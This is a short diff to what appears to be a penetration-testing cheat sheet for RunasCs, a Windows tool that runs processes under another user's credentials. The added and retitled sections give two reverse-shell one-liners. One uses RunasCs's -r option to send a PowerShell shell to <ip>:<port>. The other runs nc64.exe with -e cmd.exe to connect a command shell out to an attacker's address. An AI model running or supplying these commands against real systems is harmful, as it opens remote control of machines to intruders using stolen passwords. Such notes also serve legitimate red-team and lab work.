@@ -23,8 +23,12 @@ https://github.com/antonioCoco/RunasCs
 ```
 
 
+## builtin revshell 
+```powershell
+RunasCs.exe <user> <password> powershell.exe -r <ip>:<port>
+```
 
-## Invoke-RunAs 
+## nc revshell 
 ```powershell
 RunasCs.exe <user> <password> 'cmd /c c:\tmp\nc64.exe <ip> <port> -e cmd.exe'
 ```
